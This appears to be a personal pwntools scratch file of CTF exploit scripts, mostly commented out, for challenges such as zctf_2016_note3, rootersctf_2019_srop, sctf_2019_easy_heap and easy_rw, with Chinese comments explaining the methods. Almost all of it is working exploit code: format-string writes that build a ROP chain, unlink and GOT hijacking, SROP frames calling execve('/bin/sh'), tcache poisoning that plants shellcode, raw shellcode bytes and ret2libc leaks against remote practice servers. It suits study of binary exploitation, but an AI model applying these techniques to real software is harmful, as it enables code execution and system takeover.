#         payload=b'%'+str((main_ret&0xff)+i).encode()+b'c%19$hhn'
#     echo(payload)
#     cat()
#     word=(pop_rdi&(0xff<<(8*i)))>>(8*i)
#     payload=b'%'+str(word).encode()+b'c%49$hhn'
#     echo(payload)
#     cat()
# #!修改次数
# main_ret=(stack_addr&0xffff)-0x124
# ls('main_ret',main_ret)
# payload=b'%'+str(main_ret).encode()+b'c%19$hn'
# echo(payload)
# cat()
# word=0x1
# payload=b'%'+str(word).encode()+b'c%49$hhn'
# echo(payload)
# cat()
# #!修改ret[1]内容为binsh地址
# main_ret=(stack_addr&0xffff)-0x108
# for i in range(6):
#     if i==0:
#         payload=b'%'+str(main_ret+i).encode()+b'c%19$hn'
#     else:
#         payload=b'%'+str((main_ret&0xff)+i).encode()+b'c%19$hhn'
#     echo(payload)
#     cat()
#     word=(binsh&(0xff<<(8*i)))>>(8*i)
#     payload=b'%'+str(word).encode()+b'c%49$hhn'
#     echo(payload)
#     cat()
# #!修改次数
# main_ret=(stack_addr&0xffff)-0x124
# ls('main_ret',main_ret)
# payload=b'%'+str(main_ret).encode()+b'c%19$hn'
# echo(payload)
# cat()
# word=0x1
# payload=b'%'+str(word).encode()+b'c%49$hhn'
# echo(payload)
# cat()
# #!修改ret[2]内容为ret地址
# main_ret=(stack_addr&0xffff)-0x100
# for i in range(6):
#     if i==0:
#         payload=b'%'+str(main_ret+i).encode()+b'c%19$hn'
#     else:
#         payload=b'%'+str((main_ret&0xff)+i).encode()+b'c%19$hhn'
#     echo(payload)
#     cat()
#     word=(ret_addr&(0xff<<(8*i)))>>(8*i)
#     payload=b'%'+str(word).encode()+b'c%49$hhn'
#     echo(payload)
#     cat()
# #!修改次数
# main_ret=(stack_addr&0xffff)-0x124
# ls('main_ret',main_ret)
# payload=b'%'+str(main_ret).encode()+b'c%19$hn'
# echo(payload)
# cat()
# word=0x1
# payload=b'%'+str(word).encode()+b'c%49$hhn'
# echo(payload)
# cat()
# #!修改ret[3]内容为system地址
# main_ret=(stack_addr&0xffff)-0xf8
# for i in range(6):
#     if i==0:
#         payload=b'%'+str(main_ret+i).encode()+b'c%19$hn'
#     else:
#         payload=b'%'+str((main_ret&0xff)+i).encode()+b'c%19$hhn'
#     echo(payload)
#     cat()
#     word=(system_addr&(0xff<<(8*i)))>>(8*i)
#     payload=b'%'+str(word).encode()+b'c%49$hhn'
#     echo(payload)
#     cat()
# quit()
# p.interactive()

#-------------------------flag_server------------------------

# p=process('./flag_server')
# p=remote('node4.buuoj.cn',25871)

# sla('length: ',str(-1).encode())
# # attach(p)
# sla('username?\n',b'a'*0x40+b'\x01')

# p.interactive()

#-------------------------runit-----------------------------

# p=process('./runit')
# p=remote('node4.buuoj.cn',26765)

# # attach(p)
# p.sendlineafter('stuff!!\n',asm(shellcraft.sh()))

# p.interactive()

#-------------------------zctf_2016_note3(本地打通，远程环境有问题)-------------------
# #!本地能打通，远程部署可能有点问题。
# #!思路：read_n函数有漏洞，i为unsigned int类型，所以比较时候会强行转换成unsigned int类型去比较。
# #!而且read_n函数汇总并没有对size=0进行过滤，若size=0,则a1-1=-1,也就相当于2^63了，此时可以进行堆溢出。
# #!但由于题目并没有输出的功能，所以可以换个思路，因为不是full relro，所以可以劫持free的got为put_plt,
# #!此时只要将free(alarm_got)，即可获得libc_base。
# #!至于如何劫持got表，则可以通过unlink攻击进行，因为所有的堆指针都集中存储在0x6020c8上，所以只要控制了
# #!这个连续空间，就相当于有了任一地址写的权限。
# #!因为用gadget的方法并没有打通，所以在这里换了一个思路，就是利用system(binsh),具体步骤:
# #!首先将free_got覆盖为system_addr,然后将malloc_hook覆盖为delete函数初始地址，最后在id=3的地方利用已
# #!经被控制堆存储空间，将之覆盖为libc中的binsh地址。
# #!此时只要去执行create函数，这样在调用malloc函数的时候回去执行delete函数，此时只要输入id=3,则会执行
# #!free(id=3的堆块地址)=>>system(/bin/sh的地址)
# #!successfully exploit!
# def create(size,content):
#     sla('-->>\n',str(1).encode())
#     sla('1024)\n',str(size).encode())
#     sla('content:\n',content)
# def show():
#     sla('-->>\n',str(2).encode())
# def edit(id,content):
#     sla('-->>\n',str(3).encode())
#     sla('note:\n',str(id).encode())
#     sla('content:\n',content)
# def delete(id):
#     sla('-->>\n',str(4).encode())
#     sla('note:\n',str(id).encode())
# def quit():
#     sla('-->>\n',str(5).encode())

# # p=process('./zctf_2016_note3')
# p=remote('node4.buuoj.cn',25377)
# elf=ELF('./zctf_2016_note3')
# # libc=ELF('/home/banser/Program/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so')
# libc=ELF('./libc-2.23.so')

# free_got=elf.got.free;
# puts_plt=elf.plt.puts
# print(hex(puts_plt))
# des_addr=0x6020C8
# #!利用堆溢出，实行unlink，控制堆存储空间
# create(0x90,p64(0)+p64(0xb1)+p64(des_addr-0x18)+p64(des_addr-0x10))
# create(0,b'a')
# create(0x90,b'a')
# edit(1,b'a'*0x10+p64(0xb0)+b'\xa0')
# delete(2)
# #!控制堆存储空间，更改覆盖free_got为put_plt,并将id=3的堆块覆盖为alarm_got
# edit(0,b'a'*0x10+p64(0)+p64(0x6020b0)+p64(free_got)+p64(0x602038))
# edit(1,b'\x30\x07\x40\x00\x00\x00')
# delete(2)
# #!收集libc信息及之后需要的函数地址
# base=u64(p.recv(6).ljust(8,b'\x00'))-libc.sym.alarm
# ls('base',base)
# malloc_hook=base+libc.sym.__malloc_hook
# gadgets=[0x45206,0x4525a,0xef9f4,0xf0897]
# gadget=base+gadgets[0]
# system_addr=base+libc.sym.system
# binsh=base+0x18c58b
# ls('system_addr',system_addr)
# ls('malloc_hook',malloc_hook)
# #!覆盖malloc_hook为delete函数初始地址，覆盖free_got为system函数地址，覆盖id=3的堆块为binsh字符串地址
# edit(0,b'a'*0x10+p64(0)+p64(0x6020b0)+p64(malloc_hook)+p64(free_got)+p64(binsh))
# #!调用malloc函数，执行delete函数，然后free(id=3的堆块) =>> system(binsh)
# edit(1,p64(0x400B33))
# edit(2,p64(system_addr)[:-2])
# sla('-->>\n',str(1).encode())
# sla('1024)\n',str(1).encode())
# p.interactive()

#------------------------------rootersctf_2019_srop（SROP）-----------------------------
#!思路：利用gadget覆盖rax为0x15（64位的sigreturn调用号），调用syscall
#!去恢复我们构造好的假恢复帧，然后栈迁移到data段，写入binsh字符串，继续
#!构造第二个恢复帧（之所以去data段写binsh，是因为没有栈地址，其实也可以先
#!利用write调用，去打印一个栈上的地址，计算写入binsh的偏移也可以，但是
#!栈迁移可能更容易一些。）执行execve(binsh,0,0)
# context.arch='amd64'
# # p=process('rootersctf_2019_srop')
# p=remote('node4.buuoj.cn',28052)
# #!第一个恢复帧
# frame = SigreturnFrame(kernel="amd64")
# frame.rax=0
# frame.rdi=0
# frame.rsi=0x402000 #data
# frame.rdx=0x400
# frame.rip=0x401033 #syscall_leave_ret
# frame.rbp=0x402000+0x20
# payload=flat(
#     b'a'*0x88,
#     p64(0x401032),
#     p64(0xf),
#     bytes(frame)
# )
# sla('CTF?\n',payload)
# sleep(3)
# #!第二个恢复帧
# frame.rax=59
# frame.rdi=0x402000
# frame.rsi=0x0
# frame.rdx=0x0
# frame.rip=0x401033
# payload=flat(
#     b'/bin/sh\x00',
#     b'a'*0x20,
#     p64(0x401032),
#     p64(0xf),
#     bytes(frame)
# )
# sl(payload)
# p.interactive()

#----------------------------houseoforange_hitcon_2016--------------------------------

# p=process('./houseoforange_hitcon_2016')
# elf=ELF('./houseoforange_hitcon_2016')
# libc=ELF('/glibc/x64/2.23/lib/libc-2.23.so')

# def build(length,name,price,color):
#     sla('choice : ',str(1))
#     sla('name :',str(length))
#     sa('Name :',name)
#     sla('Price of Orange:',str(price))
#     sla('Color of Orange:',str(color))
# def see():
#     sla('choice : ',str(2))
# def upgrade(length,name,price,color):
#     sla('choice : ',str(3))
#     sla('name :',str(length))
#     sla('Name:',name)
#     sla('Price of Orange: ',str(price))
#     sla('Color of Orange: ',str(color))

# build(0x70,'asd',10,1)
# payload=b'a'*0x78+p64(0x21)+p32(0x1)+p32(0x1)+p64(0)*2+p64(0xf41)
# upgrade(0x200,payload,10,2)
# sla('choice : ',str(1))
# sla('name :',str(0xff0))

# build(0xff0,'asd',10,1)
# build(0xaf0,b'a'*0x8,10,1)
# see()
# p.recvuntil(b'aaaaaaaa')
# libc_base=u64(p.recv(6).ljust(8,b'\x00'))-0x668-0x10-libc.sym.__malloc_hook
# ls('libc_base',libc_base)


# attach(p)

# build(0x70,'asd',10,1)


# p.interactive()

#----------------------------over-the-moon-------------------------------

# from pwn import *
# sla=lambda name,context:p.sendlineafter(name,context)
# p=process('./over-the-moon.bin')
# sla('altitude:\n','1')
# payload=b'a'*40+p64(384401)
# sla('name?\n',payload)
# p.interactive()

#--------------------------sctf_2019_easy_heap-------------
#!前置知识：
#!        tcache bin中存放堆块长度范围为0x20-0x410(大于0x410的将放进unsorted bin)
#!        
#!
#!
#!总结：审查函数fill，发现其中存在off by null漏洞
#!因为没有UAF或者堆溢出等漏洞，所以可以选择通过off by null
#!原理：
#!    实现堆重叠，进而进行tcache poisoning。
#!    然后将shellcode写入mmap分配的区域（有可执行权限）
#!    最后劫持mallochook到mmap分配的区域
#!
#!
#!
#!实现对重叠(tcache dup)：
#!          首先申请——》 0号堆块  0x4f0
#!                      1号堆块  0x58
#!                      2号堆块  0x48
#!                      3号堆块  0x4f0
#!                      4号堆块  0x20
#!          通过off by null清空4号size末位（为了改inuse位）
#!          将prevsize改成0x4f0+0x50+0x40+0x10*3=0x5b0
#!          释放0号堆块
#!          释放3号堆块进行unlink操作（仅2.27可行，2.28添加了对前块size的检测），将合并块放入unsorted bin
#!          重新申请对应的堆块：0x4f0,0x58,0x48，实现堆块的重叠（意思就是将两个指针同时指向同一个堆块）
#!          ↑补充：因为无法通过堆溢出或者UAF去更改已释块的fd指针，故而只能通过堆重叠技术，去修改已释块的fd
#!          此时已经可以正常利用tcache poisoning实现任一地址写了
#!
#!将shellcode写入mmap分配区域：
#!          通过堆重叠，先将一个指针释放，然后通过另一个指针修改已释块的fd为mmap分配区
#!          将mmap区域申请出来
#!          将shellcode写入mmap区域
#!          
#!劫持mallochook到mmap：
#!          因为文件没有打印功能，所以不能leak出libc_base地址
#!          此时需要构造如下结构：
#!                              ptr1 -> 堆块1
#!                              ptr2 -> 堆块1
#!                              ptr3 -> 堆块3（在unsorted bin中，但是地址与堆块1相同）
#!          通过释放ptr1，将堆块1先放入tcache bin中
#!          然后再通过申请新堆块，去构造堆块3
#!          此时不出意外的话，堆块1的fd，其实就已经变成了堆块3的fd，一般也就是main_arena+96（unsorted bin对于main_arena的固定偏移）
#!          然后在通过修改ptr2，将堆块1的fd指针最后一位改成0x30（需要gdb调试）
#!          ↑补充：因为gdb调试出的main_arena+96的末位为0xa0,所以malloc_hook的末位应该是0xa0-96-0x10=0x30
#!          此时通过两次malloc，将malloc_hook的堆块申请出来
#!          改malloc_hook为mmap区域首地址
#!          再次调用malloc，执行malloc_hook，getshell
#!
# p=process('./sctf_2019_easy_heap')
# p=remote('node4.buuoj.cn',28748)
# def cr(size):
#     sla('>> ',str(1))
#     sla('Size: ',str(size))
# def de(id):
#     sla('>> ',str(2))
#     sla('Index: ',str(id))
# def fi(id,content):
#     sla('>> ',str(3))
#     sla('Index: ',str(id))
#     sla('Content: ',content)
# leak_addr=int(str(p.recvline())[-15:-3],16)
# ls('leak_addr',leak_addr)
# cr(0x4f0) #0
# cr(0x58) #1
# cr(0x48) #2
# cr(0x4f0) #3
# cr(0x20) #4 
# fi(2,b'a'*0x40+p64(0x5b0))
# de(0)
# de(3)
# cr(0x4f0) #0
# cr(0x58) #3
# cr(0x48)#5
# de(3)
# fi(1,p64(leak_addr))
# cr(0x58) #3
# cr(0x58) #6
# fi(6,asm(shellcraft.sh())+b'\x0a')
# cr(0x4f0) #7
# fi(5,b'a'*0x40+p64(0x5b0))
# de(5)
# de(0)
# de(7)
# cr(0x550) #0
# fi(2,b'\x30')
# cr(0x48)#5
# cr(0x48)#7
# fi(7,p64(leak_addr))
# sla('>> ',str(1))
# sla('Size: ',str(0x10))
# p.interactive()

#-------------------------str-------------------------------
# payload=b'/home/banser/Usr/Pwndir/vuln '
# payload=asm(shellcraft.sh())
# payload=b'\x90'*0x100+b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
# payload=b'\x90'*0x100+asm(shellcraft.sh())
# payload=asm(shellcraft.sh())
# num=1088-len(payload)
# payload+=p32(0x0804900e)
# p32(0x0804900e)
# attach(p)
# gdb.attach(p)
# payload=p32(0x080491f9)+b'a'*(40+0x20)+asm(shellcraft.sh())
# payload+=b' 1040'
# p=process(argv=['./vuln',payload,"10"],)
# p=gdb.debug("vuln",gdbscript="set args "+payload+" 1040",exe=)

# payload=b'\x25\x91\x04\x08'+b'jhh///sh/bin\x89\xe31\xc91\xd2j\x0bX\xcd\x80'.ljust(32, b'a')+b'\x83\xec\x04X\x83\xe8\x1fH\xff\xd0'+b'a'*2+b'\x4d\x93\x04\x08'*6
# p=process(argv=['./vuln',payload,'1040'],executable="./vuln")

# p=gdb.debug(args=["./vuln",payload,"1040"],gdbscript='''
# break vuln
# c
# n 5
# stack 300
# ''')
# p=gdb.debug(gdbscript="break vuln",exe="asdasd",args=['vuln','asd','0'])

# p.interactive()


# debug(p)
# attach(p)
# p.sendline('/home/banser/Usr/Pwndir/vuln asd 0')
# p=process('./Atest')
# attach(p)
# p.sendline(payload)

# p.interactive()

#------------------------girlfriend-------------------------

# p=process('./girlfriend')
# p=remote('node2.anna.nssctf.cn',28808)

# def add(size,name):
#     sla('choice :',str(1))
#     sla('size is :',str(size))
#     sla('name is :',name)
# def de(index):
#     sla('choice :',str(2))
#     sla('Index :',str(index))
# def see(index):
#     sla('choice :',str(3))
#     sla('Index :',str(index))

# add(0x20,'asd')
# add(0x20,'asd')
# de(0)
# de(1)
# add(0x10,p64(0x400B9C))
# see(0)
# # attach(p)

# p.interactive()

#--------------------------easy_rw---------------------------

p=process('easy_rw')
elf=ELF('./easy_rw')
from LibcSearcher import *
p_rdi=0x4013c3
main=0x4012E0
payload=b'a'*0x48+p64(p_rdi)+p64(elf.got.puts)+p64(elf.plt.puts)+p64(main)
attach(p)
p.sendafter('>> ',payload)
puts_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
log.success('puts_addr => {}'.format(hex(puts_addr)))
libc=LibcSearcher('puts',puts_addr)
base=puts_addr-libc.dump('puts')
write_addr=base+libc.dump('write')
read_addr=base+libc.dump('read')
log.success('base => {}'.format(hex(base)))
log.success('write => {}'.format(hex(write_addr)))
log.success('read => {}'.format(hex(read_addr)))
payload=b'a'*0x48+p64(p_rdi)+p64(3)+p64(read_addr)+p64(main)
p.sendafter('>> ',payload)



p.interactive()

#-------------------------heap_test--------------------------

# p=process('./HITCON_2018_children_tcache-2.23')
# elf=ELF('./HITCON_2018_children_tcache-2.23')


# def create(size,content):
#     sla("Your choice: ",str(1).encode())
#     sla("Size:",str(size).encode())
#     sla("Data:",content)

# def show(index):
#     sla("Your choice: ",str(2).encode())
#     sla("Index:",str(index).encode())

# def delete(index):
#     sla("Your choice: ",str(3).encode())
#     sla("Index:",str(index).encode())
# s='a'
# create(0xa0,b'a'*0x20)
# create(0x10,s)
# create(0x90,s)
# create(0x10,s)
# create(0xb0,s)
# create(0x10,s)
# create(0xc0,s)
# create(0x10,s)
# delete(0)
# delete(2)
# # delete(2)
# # create(0x70,s)
# create(0x90,s)

# attach(p)

# p.interactive()

#---------------------------------------
# p=process('./Atest')

# p.sendline(b'a'*0x30)
# attach(p)

# p.interactive()

#-------------------------------------------------------
